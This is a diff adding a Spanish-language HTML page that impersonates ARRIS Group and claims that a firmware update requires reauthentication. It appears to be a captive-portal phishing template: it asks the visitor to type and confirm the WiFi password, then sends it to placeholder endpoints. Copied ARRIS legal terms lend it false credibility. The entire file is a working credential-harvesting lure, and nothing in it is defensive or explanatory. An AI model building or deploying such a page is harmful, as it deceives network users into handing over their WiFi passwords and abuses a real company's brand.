@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="/images/arris.png" type="image/x-icon">
+<link rel="stylesheet" type="text/css" href="/splash.css">
+<script>
+    function mostrarTC() {
+      alert("Estos Términos y Condiciones de Uso de ARRIS Solutions, Inc. (“Acuerdo”) es un acuerdo legal entre Usted y ARRIS Solutions, Inc. (aquí referenciado como 'ARRIS', 'nosotros'  'nos' o 'nuestro') el cual proporciona, entre otras cosas, los términos y condiciones para el uso de las aplicaciones de software ARRIS que se entregan con los set-tops o gateways ARRIS o no-ARRIS o que son descargados a estos u otras plataformas móviles compatibles de, inclusive en las plataformas de los teléfonos móviles, tablets u otras plataformas ('Aplicación con Licencia Autorizada'), que incluye el programa o firmware en los dispositivos relacionados, y/o servicios entregados a través de cualquier sitio o sitios web de ARRIS http://www.arris.com u otros ('Sitios Web'). Colectivamente la Aplicación con Licencia Autorizada y los Sitios Web pueden ser referidos como 'Servicios ARRIS'. Al hacer clic en Aceptar, usted confirma que ha adquirido la Aplicación con Licencia Autorizada de un vendedor aprobado y que está registrado como usuario final con su proveedor de servicios. Este Acuerdo es entre Usted y ARRIS solamente, y no con Apple, Inc. ('Apple') o Google Inc. ('Google') o Sling Technologies. Además, ARRIS y otras terceras partes son responsables de los Servicios ARRIS, y del contenido del mismo. ARRIS podrá, de vez en cuando, modificar las presentes condiciones de uso y publicará el Acuerdo modificado en http://www.arris.com/legal/. Si no está de acuerdo, o no puede cumplir con el Acuerdo modificado, deberá dejar de utilizar los Servicios ARRIS y retirar la Aplicación con Licencia Autorizada de su dispositivo (como se define más adelante). Se considerará que ha aceptado el Acuerdo modificado si continúa utilizando cualquiera de los Servicios ARRIS o la Aplicación con Licencia Autorizada después de que las modificaciones sean publicadas en el sitio Web.");
+    }
+    function validarForm() {
+        var pass1 = document.getElementById("pass_1");
+        var pass2 = document.getElementById("pass_2");
+        if (pass1.value != pass2.value) {
+            alert("La confirmacion de la contraseña no es la misma.");
+            return false;
+        }
+        return true;
+    }
+</script>
+<title>Actualizacion de Firmware.</title>
+</head>
+    <body>
+        <div class="offset">
+            <div class="insert">
+                <center><img src="/images/arris.png" alt="Imagen ARRIS. Rellena el formulario para continuar."></center>
+                <hr>
+                <big-red>ARRIS Group Inc.</big-red>
+                <hr>
+                <br>
+                <italic-black>Firmware actualizado. Necesaria reautenticación.</italic-black>
+                <br>
+                <hr>
+                <form method="get" action="$authaction" onsubmit="return validarForm()">
+                    <input type="hidden" name="tok" value="$tok">
+                    <input type="hidden" name="redir" value="$redir">
+                    <br>
+                    <label for="pass">Contraseña WiFi:</label>
+                    <br>
+                    <input type="password" id="pass_1" name="username" required="required">
+                    <br>
+                    <label for="passCheck">Repetir contraseña WiFi:</label>
+                    <br>
+                    <input type="password" id="pass_2" name="password" required="required">
+                    <br>
+                    <br>
+                    <input type="checkbox" id="tc" required="required"><label for="tc" onclick="mostrarTC()">Términos y condiciones.</label>
+                    <br>
+                    <br>
+                    <input type="submit" value="Continue">
+                    <br>
+                </form>
+                <hr>
+                <copy-right>Copyright &copy; ARRIS Group Inc.</copy-right>
+            </div>
+        </div>
+    </body>
+</html>
